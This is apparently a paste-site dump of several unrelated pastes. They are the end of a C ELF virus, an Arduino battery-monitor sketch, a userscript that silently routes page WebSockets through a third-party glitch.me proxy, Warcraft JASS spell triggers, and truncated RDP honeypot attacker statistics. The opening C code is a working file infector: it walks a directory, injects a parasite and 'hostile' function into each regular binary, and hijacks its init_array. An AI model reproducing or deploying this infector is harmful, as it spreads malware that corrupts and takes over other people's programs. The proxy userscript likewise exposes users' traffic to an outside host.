                {
                    elfrela->r_addend = (Elf64_Sxword)(target_code_vaddr + target_code_size);
                    break;
                }
            }
        }
    }
    *target_elf->elfstructs.initarray = target_code_vaddr + target_code_size;

    target_elf->elfstructs.textphdr->p_memsz  += parasite_len + target_elf->hostilefunc.hostile_len;
    target_elf->elfstructs.textphdr->p_filesz += parasite_len + target_elf->hostilefunc.hostile_len;

    pi_edit_parasite();
    
    old_osabi = target_elf->elfstructs.ehdr->e_ident[EI_OSABI];

    if (pi_create_infected_clone() == PI_OPERATION_ERROR)
        target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = old_osabi; //infection fails so unmark the binary

target_cleanup:
    pi_munmap((uint64_t)target_elf->mmap,target_elf->stat.st_size);
    pi_close(target_elf->fd);
}

int32_t pi(const char *target_dir)
{
    char dirents_buf[DIRENTS_BUF_SIZE];
    int64_t fd, nread, syscall_ret;
    linux_dirent64_t *dir;
   
    syscall_ret = pi_chdir(target_dir);
    pi_check_syscall_fault(syscall_ret);

    fd = pi_open(target_dir,O_RDONLY | O_DIRECTORY,0);
    pi_check_syscall_fault(fd);

    if (pi_mm_getpool() == PI_OPERATION_ERROR)
        return PI_OPERATION_ERROR;

    for (;;)
    {
        nread = pi_getdents64(fd,dirents_buf,DIRENTS_BUF_SIZE);
        pi_check_syscall_fault(nread);

        if (nread == 0)
            break;

        for (uint64_t pos = 0, i = 0; pos < nread; ++i, pos += dir->d_reclen)
        {
            dir = (struct linux_dirent64 *)(dirents_buf + pos);

            if (dir->d_type == DT_REG)
            {

                target_elf = pi_malloc(sizeof(target_elf_t));
                
                target_elf->name = dir->d_name;
                
                pi_infect_target();

                pi_free(target_elf);
            }
        }
    }

    return PI_OPERATION_SUCCESS;
}
void _start(start_args_t start_args)
{
    pi(start_args.argv[1]);
    pi_exit(0);
}
"
AyRHtpz4,Reading Battery Voltages Code Rev 2,JonD1988,Arduino,Friday 7th of July 2023 08:20:18 PM CDT,"#include <Wire.h> //Needed to Use ADS1115 ADC - See Reference 12
#include <ADS1115_lite.h> //Needed to Use ADS1115 ADC - See Reference 12
ADS1115_lite ads(ADS1115_DEFAULT_ADDRESS); //0x48 addr pin connected to GND. Needed to Use ADS1115 ADC - See Reference 12
long raw1 = 0, raw2 = 0; //Needed to Use ADS1115 ADC - See Reference 12
double resolution=0; //Needed to Use ADS1115 ADC - See Reference 12
int batt1Analog = 0, batt2Analog=0; //Analog readings from batt1Pin and batt2Pin and then actual battery voltages
float batt1V=0, batt2V=0; 
unsigned long previousMillis = 0;      // will store last time the battery voltages were read
const long interval = 10000;           // interval at which to read the battery voltage (milliseconds)
#define battCutOff 3.0 //Voltage to Cutoff Motors to Protect the Batteries
#define numReadsToAvg 3 //Number of Voltage Readings to Store and Take Average Of
float batt1VArray[numReadsToAvg]; //Array to store batt1V readings i.e. battery 1 voltages
float batt2VArray[numReadsToAvg]; //Array to store batt2V readings i.e. battery 2 voltages
int batt1VIndex = 0, batt2VIndex = 0; //Keeps track of the array indexes for the batt1VArray and batt2VArray
float batt1VAvg = 3.0, batt2VAvg = 3.0; //Initialize battery voltage reading averages to 3.0
float batt1VSum = 0.0, batt2VSum = 0.0; //Sums all the elements in the batt1VArray and the batt2VArray for use in the average calculations
int batt1VCount = 0, batt2VCount = 0; //Variable to keep track of the count of how many elements have been stored in the batt1VArray and batt2VArray - really only meant to be used initially before all elements of the arrays have been updated with non-zero values

void setup()
{ //start of void setup()
  ads_config(); //Needed to Use ADS1115 ADC - See Reference 12
  //Initialize elements of batt1VArray and batt2VArray to 3.5
  for(int m = 0; m < numReadsToAvg; m++)
  { //Start of for loop to initialize arrays to 3.5
	  batt1VArray[m] = 3.5;
	  batt2VArray[m] = 3.5;
  } //End of for loop to initialize arrays to 3.5
} //end of void setup()

void loop()
{ //start of void loop()

unsigned long currentMillis = millis(); //Checks the current time

    if (currentMillis - previousMillis >= interval) //Check to see if it's time to read the battery voltages (if the difference between the current time and last time you read the battery voltages is bigger than the interval at which you want to read the battery voltages)
    { //Start of if (currentMillis - previousMillis >= interval)
        previousMillis = currentMillis; //save the last time you read the battery voltages before you read the battery voltages
        readBatts(); //Read the battery voltages
    } //End of if (currentMillis - previousMillis >= interval)

} //end of void loop()

void readBatts()
{ //Start of readBatts function definition
  raw1 = ads_read1(); //Reads A0 from ADS1115 - Reference 12
  resolution=4096.00/32752.00;
  delay(200);
  float result1=(raw1*resolution)/1000.00; //batt1 voltage + batt2 voltage
  raw2 = ads_read2(); //Reads A0 from ADS1115 - Reference 12
  delay(200);
  float result2=(raw2*resolution)/1000.00; //batt2 voltage alone
  batt1V = result1 - result2; //Assigns battery 1 voltage alone to batt1V variable
  batt1V = 11.03*batt1V;
  batt2V = result2; //Assigns result2 to the batt2V variable
  batt2V = 11.0*batt2V;
  
  batt1VArray[batt1VIndex] = batt1V; //Store the current batt1V value into the element of the batt1VArray that matches batt1VIndex
  batt2VArray[batt2VIndex] = batt2V; //Store the current batt2V value into the element of the batt2VArray that matches batt2VIndex
  batt1VIndex = (batt1VIndex + 1) % numReadsToAvg; //Increments batt1VIndex by 1 each time this line runs and the % numReadsToAvg means that the batt1VIndex will take on values from 0 up to but not including numReadsToAvg (i.e. 0, 1, 2, 0, 1, 2, etc. if numReadsToAvg = 3)
  batt2VIndex = (batt2VIndex + 1) % numReadsToAvg; //Increments batt2VIndex by 1 each time this line runs and the % numReadsToAvg means that the batt2VIndex will take on values from 0 up to but not including numReadsToAvg (i.e. 0, 1, 2, 0, 1, 2, etc. if numReadsToAvg = 3)
  
  //Perform the average calculation with non-zero elements of the batt1VArray and batt2VArray
  for(int i=0; i<numReadsToAvg; i++)
  { //Start of for loop to step through the elements in the batt1VArray
	  	  batt1VSum += batt1VArray[i]; //Add the current value to the running sum for the average calculation 
  } //end of for loop to step through the elements in the batt1VArray
  
	  batt1VAvg = batt1VSum / numReadsToAvg; //Calculates the average
  //Without the following line of code batt1VSum could increase without limit (as much as that variable type can hold) retaining impact from values beyond the current set of stored readings in the array and therefore wouldn't react to newer voltage readings after a while
  batt1VSum = 0.0; //After the sum is used in the calculation of the current batt1VAvg set it back to its initial value so that it isn't impacted by past readings. The sum is meant to be used for the current set of numReadsToAvg

  for(int j=0; j<numReadsToAvg; j++)
  { //Start of for loop to step through the elements in the batt2VArray
		  batt2VSum += batt2VArray[j]; //Add the current value to the running sum for the average calculation 
  } //end of for loop to step through the elements in the batt2VArray
  
	  batt2VAvg = batt2VSum / numReadsToAvg; //Calculates the average
  //Without the following line of code batt2VSum could increase without limit (as much as that variable type can hold) retaining impact from values beyond the current set of stored readings in the array and therefore wouldn't react to newer voltage readings after a while
  batt2VSum = 0.0; //After the sum is used in the calculation of the current batt2VAvg set it back to its initial value so that it isn't impacted by past readings. The sum is meant to be used for the current set of numReadsToAvg
  
  //This section of code sends the battery voltages to the Android app
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""W"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  //SerialBT.print(batt1V);
  SerialBT.print(batt1VAvg);  
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""w"");  //Delimeter separating values which the receiving app is programmed to recognize

  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""Z"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  //SerialBT.print(batt2V);
  SerialBT.print(batt2VAvg);
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize      
  SerialBT.print(""z"");  //Delimeter separating values which the receiving app is programmed to recognize

  //if (batt1V < battCutOff || batt2V < battCutOff) //If either battery drops below the cutoff voltage
  if (batt1VAvg < battCutOff || batt2VAvg < battCutOff) //If either battery drops below the cutoff voltage
  { //Start of if (batt1V < battCutOff || batt2V < battCutOff)
    stopVehicle(); //Stop Power to the Motors
    lightFState = 0; //Turns Off Front Lights
    lightBState = 0; //Turns Off Back Lights
    hornH(); //Turns horn on briefly
    delay(100);
    hornL();
   } //End of if (batt1V < battCutOff || batt2V < battCutOff)
  
} //End of readBatts function definition

void ads_config(){
  ads.setGain(ADS1115_REG_CONFIG_PGA_4_096V); // GAIN_ONE and resolution to ± 4.096V
  ads.setSampleRate(ADS1115_REG_CONFIG_DR_8SPS); // Set to the fastest MODE 860Samples per sec
}

int16_t ads_read1(){ 
  ads.setMux(ADS1115_REG_CONFIG_MUX_SINGLE_0);  // Single mode input on AIN0 (AIN0 - GND)
  ads.triggerConversion();  // Triggered mannually 
  return ads.getConversion();  // returns int16_t value
}

int16_t ads_read2(){ 
  ads.setMux(ADS1115_REG_CONFIG_MUX_SINGLE_1);  // Single mode input on AIN1 (AIN1 - GND)
  ads.triggerConversion();  // Triggered mannually 
  return ads.getConversion();  // returns int16_t value
}
//Reference 12- Reading Analog Voltages Using ADS1115 https://www.youtube.com/watch?v=u-1TRpLGH04"
q1KTuPHm,self wsproxy,scar17off,JavaScript,Friday 7th of July 2023 07:46:44 PM CDT,"// ==UserScript==
// @name         self wsproxy
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  make your websocket use wsproxy
// @author       scar17off
// @match        *://*/*
// @grant        none
// ==/UserScript==


(function() {
    let ws = window.WebSocket;
    let old_ws = ws;
    let wsproxy_url = ""wss://ws-proxynbjc-0055.glitch.me/?wss="";
    let proxied = false;
    class modifier extends ws {
        constructor(...a) {
           	if(!proxied) {
                super(wsproxy_url + a[0]);
                proxied = true;
            } else {
                super(...a);
            }
        };
    };
    window.WebSocket = modifier;
})();"
Wc7Puj8H,jass скил холод,krot,JavaScript,Friday 7th of July 2023 07:26:45 PM CDT,"скил ""Холод""

function Trig_PL02_Conditions takes nothing returns boolean
return GetSpellAbilityId() == 'A0DB'
endfunction

function Trig_PL02_G takes nothing returns boolean
return GetWidgetLife(GetFilterUnit()) > 0.405 and IsUnitEnemy(GetFilterUnit(), GetOwningPlayer(GetSpellAbilityUnit()))
endfunction

function PL02_End takes nothing returns nothing
local timer t = GetExpiredTimer()
local integer tID = GetHandleId(t)
local unit c = LoadUnitHandle(udg_cache,1,tID)
call KillUnit©
call RemoveUnit©
call DestroyTimer(t)
set c = null
set t = null
endfunction

function DummyUnit takes player pl, location l, integer lvl returns nothing
local timer t = CreateTimer()
local unit c = CreateUnitAtLoc(pl,'h00P',l, 0)
local integer tID = GetHandleId(t)
call RemoveLocation(l)
call UnitAddAbility(c,'A0DH')
call SetUnitAbilityLevel(c,'A0DH',lvl)
call IssueImmediateOrder(c,""creepthunderclap"")
call SaveUnitHandle(udg_cache, 1, tID, c)
call TimerStart(t,.5, false, function PL02_End )
set c = null
set t = null
endfunction

function Trig_PL02_Actions takes nothing returns nothing
local unit uA = GetSpellAbilityUnit()
local player p = GetOwningPlayer(uA)
local location lT = GetSpellTargetLoc()
local integer lvl = GetUnitAbilityLevel(uA,'A0DB')
local group g = CreateGroup()
local group g2 = CreateGroup()
local real osDmg = 10 + 10*lvl
local real dopDmg = 10*lvl
local real dmg
local real rad = 375
local integer sec = 8
local unit f
local unit c
local integer In
set g = GetUnitsInRangeOfLocMatching(rad,lT, Condition(function Trig_PL02_G))
call DummyUnit(p,lT,lvl)
set In = 1
loop
exitwhen In > sec or FirstOfGroup(g) == null
set g2 = CopyGroup(g)
loop
set f = FirstOfGroup(g2)
exitwhen f == null
if GetUnitAbilityLevel(f,'B02E') > 0 then
set dmg = osDmg + dopDmg
else
set dmg = osDmg
endif
if GetWidgetLife(f) > 0.405 then
call UnitDamageTarget(uA,f,dmg,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
else
call GroupRemoveUnitSimple(f,g)
endif
call GroupRemoveUnitSimple(f,g2)
endloop
call PolledWait(1)
set In = In + 1
endloop
call DestroyGroup(g2)
set uA = null
set p = null
set lT = null
set g = null
set g2 = null
set f = null
set c = null
endfunction

function InitTrig_PL02 takes nothing returns nothing
local integer temp = 0
local integer max = bj_MAX_PLAYER_SLOTS
set gg_trg_PL02 = CreateTrigger( )
loop
exitwhen temp == max
call TriggerRegisterPlayerUnitEvent(gg_trg_PL02, Player(temp), EVENT_PLAYER_UNIT_SPELL_EFFECT, null)
set temp = temp + 1
endloop
call TriggerAddCondition( gg_trg_PL02, Condition( function Trig_PL02_Conditions ) )
call TriggerAddAction( gg_trg_PL02, function Trig_PL02_Actions )
endfunction

Скил ""Заморозка"":

function Trig_PL03_Conditions takes nothing returns boolean
return GetUnitAbilityLevel(GetTriggerUnit(),'A0D9') > 0 and GetUnitTypeId(GetTriggerUnit()) == 'U00A'
endfunction

function PL03_End takes nothing returns nothing
local timer t = GetExpiredTimer()
local integer tID = GetHandleId(t)
local unit c = LoadUnitHandle(udg_cache,1,tID)
local effect e = LoadEffectHandle(udg_cache,2,tID)
call DestroyEffect(e)
call SetUnitTimeScale( c, 1.00 )
call PauseUnit(c, false)
call DestroyTimer(t)
set c = null
set t = null
set e = null
endfunction

function Trig_PL03_Actions takes nothing returns nothing
local effect e
local timer t = CreateTimer()
local integer tID = GetHandleId(t)
local unit u = GetTriggerUnit()
local unit T = GetAttacker()
local integer lvl = GetUnitAbilityLevel(u,'A0D9')
local real time = 0.5*lvl
local real dmg = 50*lvl
local integer percent = 18
local integer c = GetRandomInt(1,100)
if c <= percent then
call SetUnitTimeScale( T, 0.00 )
call PauseUnit(T, true)
call UnitDamageTarget(u,T,dmg,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
if GetWidgetLife(T) <= 0.405 then
set time = 0
endif
set e = AddSpecialEffectTarget(""Abilities\\Spells\\Undead\\FreezingBreath\\FreezingBreathTargetArt.mdl"", T, ""origin"" )
call SaveUnitHandle(udg_cache, 1, tID, T)
call SaveEffectHandle(udg_cache, 2, tID, e)
call TimerStart(t,time, false, function PL03_End )
endif
set e = null
set u = null
set T = null
set t = null
endfunction

function InitTrig_PL03 takes nothing returns nothing
local integer temp = 0
local integer max = bj_MAX_PLAYER_SLOTS
set gg_trg_PL03 = CreateTrigger( )
loop
exitwhen temp == max
call TriggerRegisterPlayerUnitEvent(gg_trg_PL03, Player(temp), EVENT_PLAYER_UNIT_ATTACKED, null)
set temp = temp + 1
endloop
call TriggerAddCondition( gg_trg_PL03, Condition( function Trig_PL03_Conditions ) )
call TriggerAddAction( gg_trg_PL03, function Trig_PL03_Actions )
endfunction

Скил ""Льды"":

function Trig_PL04_Conditions takes nothing returns boolean
return GetSpellAbilityId() == 'A0DJ' or GetSpellAbilityId() == 'A0DG'
endfunction

function Trig_PL04_G takes nothing returns boolean
return GetWidgetLife(GetFilterUnit()) > 0.405 and IsUnitEnemy(GetFilterUnit(), GetOwningPlayer(GetSpellAbilityUnit()))
endfunction

function Trig_PL04_Actions takes nothing returns nothing
local integer idspell = GetSpellAbilityId()
local integer idsimple = 'A0DJ'
local integer id_dummy_spell = 'A0DI'
local group g = CreateGroup()
local group g2 = CreateGroup()
local group g3 = CreateGroup()
local unit u = GetSpellAbilityUnit()
local player p = GetOwningPlayer(u)
local location locT = GetSpellTargetLoc()
local integer lvl = GetUnitAbilityLevel(u,idspell)
local integer time = 4+lvl
local real dmg = 150.00 * I2R(lvl)
local real dopdmg = 100.00
local integer doptime = 1
local real radiusOs = 500.00
local real radiusDop = 190.00
local real delta = 18.00
local string eff = ""Abilities\\Spells\\Undead\\FrostArmor\\FrostArmorTarget.mdl""
local integer In = 1
local unit f
local location l
local location ll
local effect e
local effect array e2
local unit c
local unit uu
set ll = locT
set e2[1] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll) - delta, GetLocationY(ll) - delta)
set e2[2] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll), GetLocationY(ll) + 2*delta)
set e2[3] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll) + 2*delta, GetLocationY(ll))
set e2[4] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll), GetLocationY(ll) - 2*delta)
set e2[5] = AddSpecialEffectLoc(eff,ll)
if idspell == idsimple then
set time = time + doptime
set dmg = dmg + dopdmg
endif
loop
exitwhen In > time or LoadBoolean( udg_cache, 1, StringHash(""pr""))
set g = GetUnitsInRangeOfLocMatching(radiusOs, locT, Condition(function Trig_PL04_G))
set uu = GroupPickRandomUnit(g)
set l = GetUnitLoc(uu)
set g2 = GetUnitsInRangeOfLocMatching(radiusDop, l, Condition(function Trig_PL04_G))
loop
set f = FirstOfGroup(g2)
exitwhen f == null
if IsUnitEnemy(f,p) == true and GetWidgetLife(f) > 0.405 then
call UnitDamageTarget(u,f,dmg,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
if GetWidgetLife(f)>0.405 then
set c = CreateUnitAtLoc(p,'h00P',GetUnitLoc(f),0.00)
call GroupAddUnit(g3,c)
call UnitAddAbility(c,id_dummy_spell)
call IssueTargetOrder(c,""slow"",f)
endif
endif
call GroupRemoveUnit(g2,f)
endloop
call GroupClear(g)
if IsUnitEnemy(uu,p) == true then
set e = AddSpecialEffectLoc(""Abilities\\Spells\\Undead\\FrostNova\\FrostNovaTarget.mdl"",l)
endif
call PolledWait(1)
call DestroyEffect(e)
loop
set f = FirstOfGroup(g3)
exitwhen f == null
call KillUnit(f)
call RemoveUnit(f)
call GroupRemoveUnit(g3,f)
endloop
set In = In + 1
endloop
call DestroyEffect(e2[1])
call DestroyEffect(e2[2])
call DestroyEffect(e2[3])
call DestroyEffect(e2[4])
call DestroyEffect(e2[5])
call DestroyGroup(g)
call DestroyGroup(g2)
call DestroyGroup(g3)
call RemoveLocation(locT)
call RemoveLocation(l)
call RemoveLocation(ll)
set g = null
set g2 = null
set g3 = null
set f = null
set u = null
set uu = null
set locT = null
set l = null
set ll = null
set e = null
set e2[1] = null
set e2[2] = null
set e2[3] = null
set e2[4] = null
set e2[5] = null
set eff = null
set c = null
set p = null
endfunction

function InitTrig_PL04 takes nothing returns nothing
local integer temp = 0
local integer max = bj_MAX_PLAYER_SLOTS
set gg_trg_PL04 = CreateTrigger( )
loop
exitwhen temp == max
call TriggerRegisterPlayerUnitEvent(gg_trg_PL04, Player(temp), EVENT_PLAYER_UNIT_SPELL_EFFECT, null)
set temp = temp + 1
endloop
call TriggerAddCondition( gg_trg_PL04, Condition( function Trig_PL04_Conditions ) )
call TriggerAddAction( gg_trg_PL04, function Trig_PL04_Actions )
endfunction
"
CfTLUK92,2023-07-06_stats.json,rdp_snitch,JSON,Friday 7th of July 2023 07:18:21 PM CDT,"{
  ""ip"": {
    ""192.210.226.140"": 8337,
    ""114.217.18.245"": 105,
    ""85.53.127.115"": 9,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 108,
    ""69.58.124.234"": 141,
    ""138.91.227.8"": 3,
    ""150.230.79.119"": 48,
    ""120.71.0.5"": 120,
    ""20.42.101.211"": 150,
    ""125.74.93.228"": 129,
    ""92.204.139.79"": 135,
    ""62.122.184.168"": 24,
    ""62.122.184.166"": 24,
    ""36.108.169.132"": 114,
    ""178.21.163.70"": 27,
    ""192.99.110.133"": 18,
    ""36.137.91.143"": 27,
    ""198.211.105.13"": 3,
    ""36.20.126.147"": 78,
    ""162.142.125.216"": 3,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 12,
    ""185.122.204.28"": 18,
    ""168.138.149.190"": 21,
    ""185.170.144.3"": 6,
    ""31.43.185.32"": 24,
    ""201.93.165.53"": 27,
    ""141.98.11.128"": 6,
    ""62.122.184.38"": 9,
    ""172.105.157.114"": 3,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 18,
    ""103.195.236.213"": 30,
    ""164.92.158.134"": 9,
    ""87.251.64.110"": 6,
    ""72.255.62.89"": 18,
    ""87.251.75.120"": 3,
    ""45.119.81.119"": 3,
    ""209.146.28.26"": 3,
    ""177.72.147.36"": 3,
    ""205.210.31.31"": 9,
    ""52.152.223.59"": 3,
    ""193.233.21.96"": 9,
    ""185.11.61.117"": 3,
    ""205.210.31.176"": 9
  },
  ""asn"": {
    ""AS36352"": 8337,
    ""AS4134"": 105,
    ""AS12479"": 9,
    ""AS201689"": 54,
    ""AS8866"": 108,
    ""AS32899"": 141,
    ""AS8075"": 156,
    ""AS31898"": 69,
    ""AS137695"": 234,
    ""AS141998"": 129,
    ""AS398108"": 135,
    ""AS57523"": 78,
    ""AS21419"": 27,
    ""AS16276"": 18,
    ""AS9808"": 27,
    ""AS14061"": 12,
    ""AS58461"": 78,
    ""AS398324"": 3,
    ""AS208091"": 9,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS211736"": 24,
    ""AS27699"": 27,
    ""AS209605"": 6,
    ""AS63949"": 3,
    ""AS3462"": 18,
    ""AS140827"": 30,
    ""AS9541"": 18,
    ""AS131386"": 3,
    ""AS135607"": 3,
    ""AS262414"": 3,
    ""AS396982"": 18,
    ""AS56380"": 9
  },
  ""isp"": {
    ""ColoCrossing"": 8337,
    ""Chinanet"": 183,
    ""Uni2 1"": 9,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Corporation"": 156,
    ""Oracle Corporation"": 69,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""China Telecom"": 129,
    ""GoDaddy.com, LLC"": 135,
    ""Chang Way Technologies Co. Limited"": 78,
    ""Pishtaze E Jadid Infomration Company"": 27,
    ""OVH SAS"": 18,
    ""China Mobile"": 27,
    ""DigitalOcean, LLC"": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 9,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Vivo"": 27,
    ""UAB Host Baltic"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Cyber Internet Services (Private) Limited"": 18,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Google LLC"": 18,
    ""''IT FRUIT'' S.R.L."": 9
  },
  ""org"": {
    ""Holdings LLC"": 8337,
    ""Chinanet JS"": 105,
    ""Unknown"": 324,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Azure Cloud (westus)"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 69,
    ""Chinanet XJ"": 120,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GS"": 129,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 18,
    ""China Mobile Communications Corporation"": 27,
    ""Digital Ocean"": 3,
    ""Censys Inc"": 3,
    ""Xhost Internet Solutions"": 15,
    ""Starcrecium Limited"": 21,
    ""Xhostis"": 6,
    ""FOP Dmytro Nedilskyi"": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 27,
    ""Linode"": 3,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""DULIEUAZ"": 30,
    ""DigitalOcean, LLC"": 9,
    ""Cyber Internet Services Pakistan"": 18,
    ""IPS, Inc"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Palo Alto Networks, Inc"": 18
  },
  ""regionName"": {
    ""New York"": 8337,
    ""Jiangsu"": 105,
    ""Andalusia"": 9,
    ""Tehran"": 81,
    ""Sofia-Capital"": 108,
    ""Ohio"": 141,
    ""California"": 21,
    ""Sao Paulo"": 99,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""Virginia"": 288,
    ""Gansu"": 129,
    ""Moscow"": 87,
    ""Zhejiang"": 192,
    ""Quebec"": 18,
    ""Guangdong"": 27,
    ""New Jersey"": 3,
    ""Michigan"": 3,
    ""North Holland"": 18,
    ""Beijing"": 12,
    ""Kyiv City"": 24,
    ""Kaunas"": 6,
    ""Georgia"": 3,
    ""Taipei City"": 18,
    ""Ho Chi Minh"": 33,
    ""Sindh"": 18,
    ""Metro Manila"": 3,
    ""Chi\u0219in\u0103u Municipality"": 9,
    ""Chechnya"": 3
  },
  ""country"": {
    ""United States"": 8796,
    ""China"": 585,
    ""Spain"": 9,
    ""Iran"": 81,
    ""Bulgaria"": 108,
    ""Brazil"": 99,
    ""Russia"": 90,
    ""Canada"": 18,
    ""Netherlands"": 18,
    ""Ukraine"": 24,
    ""Lithuania"": 6,
    ""Taiwan"": 18,
    ""Vietnam"": 33,
    ""Pakistan"": 18,
    ""Philippines"": 3,
    ""Moldova"": 9
  },
  ""account"": {
    ""hello"": 8565,
    ""142.93.8.59"": 1191,
    ""Domain"": 75,
    ""(empty)"": 3,
    ""Administr"": 57,
    ""Test"": 6,
    ""YDjoJvDdZ"": 3,
    ""doJwsF"": 3,
    ""ZzFXVr"": 3,
    ""BIFdwzGps"": 3,
    ""UAjPxq"": 3,
    ""XDiZnG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9915
  },
  ""client_build"": {
    ""Unknown"": 9915
  },
  ""client_name"": {
    ""Unknown"": 9915
  },
  ""ip_type"": {
    ""hosting"": 8589,
    ""Unknown"": 1098,
    ""mobile"": 183,
    ""hosting & proxy"": 27,
    ""proxy"": 18
  }
}"
de1N92ze,2023-07-06_stats.json,rdp_snitch,JSON,Friday 7th of July 2023 07:16:04 PM CDT,"{
  ""ip"": {
    ""192.210.226.140"": 8336,
    ""114.217.18.245"": 105,
    ""85.53.127.115"": 9,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 108,
    ""69.58.124.234"": 141,
    ""138.91.227.8"": 3,
    ""150.230.79.119"": 48,
    ""120.71.0.5"": 120,
    ""20.42.101.211"": 150,
    ""125.74.93.228"": 129,
    ""92.204.139.79"": 135,
    ""62.122.184.168"": 24,
    ""62.122.184.166"": 24,
    ""36.108.169.132"": 114,
    ""178.21.163.70"": 27,
    ""192.99.110.133"": 18,
    ""36.137.91.143"": 27,
    ""198.211.105.13"": 3,
    ""36.20.126.147"": 78,
    ""162.142.125.216"": 3,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 12,
    ""185.122.204.28"": 18,
    ""168.138.149.190"": 21,
    ""185.170.144.3"": 6,
    ""31.43.185.32"": 24,
    ""201.93.165.53"": 27,
    ""141.98.11.128"": 6,
    ""62.122.184.38"": 9,
    ""172.105.157.114"": 3,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 18,
    ""103.195.236.213"": 30,
    ""164.92.158.134"": 9,
    ""87.251.64.110"": 6,
    ""72.255.62.89"": 18,
    ""87.251.75.120"": 3,
    ""45.119.81.119"": 3,
    ""209.146.28.26"": 3,
    ""177.72.147.36"": 3,
    ""205.210.31.31"": 9,
    ""52.152.223.59"": 3,
    ""193.233.21.96"": 9,
    ""185.11.61.117"": 3,
    ""205.210.31.176"": 9
  },
  ""asn"": {
    ""AS36352"": 8336,
    ""AS4134"": 105,
    ""AS12479"": 9,
    ""AS201689"": 54,
    ""AS8866"": 108,
    ""AS32899"": 141,
    ""AS8075"": 156,
    ""AS31898"": 69,
    ""AS137695"": 234,
    ""AS141998"": 129,
    ""AS398108"": 135,
    ""AS57523"": 78,
    ""AS21419"": 27,
    ""AS16276"": 18,
    ""AS9808"": 27,
    ""AS14061"": 12,
    ""AS58461"": 78,
    ""AS398324"": 3,
    ""AS208091"": 9,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS211736"": 24,
    ""AS27699"": 27,
    ""AS209605"": 6,
    ""AS63949"": 3,
    ""AS3462"": 18,
    ""AS140827"": 30,
    ""AS9541"": 18,
    ""AS131386"": 3,
    ""AS135607"": 3,
    ""AS262414"": 3,
    ""AS396982"": 18,
    ""AS56380"": 9
  },
  ""isp"": {
    ""ColoCrossing"": 8336,
    ""Chinanet"": 183,
    ""Uni2 1"": 9,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Corporation"": 156,
    ""Oracle Corporation"": 69,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""China Telecom"": 129,
    ""GoDaddy.com, LLC"": 135,
    ""Chang Way Technologies Co. Limited"": 78,
    ""Pishtaze E Jadid Infomration Company"": 27,
    ""OVH SAS"": 18,
    ""China Mobile"": 27,
    ""DigitalOcean, LLC"": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 9,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Vivo"": 27,
    ""UAB Host Baltic"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Cyber Internet Services (Private) Limited"": 18,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Google LLC"": 18,
    ""''IT FRUIT'' S.R.L."": 9
  },
  ""org"": {
    ""Holdings LLC"": 8336,
    ""Chinanet JS"": 105,
    ""Unknown"": 324,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Bresco Broadband"": 141,
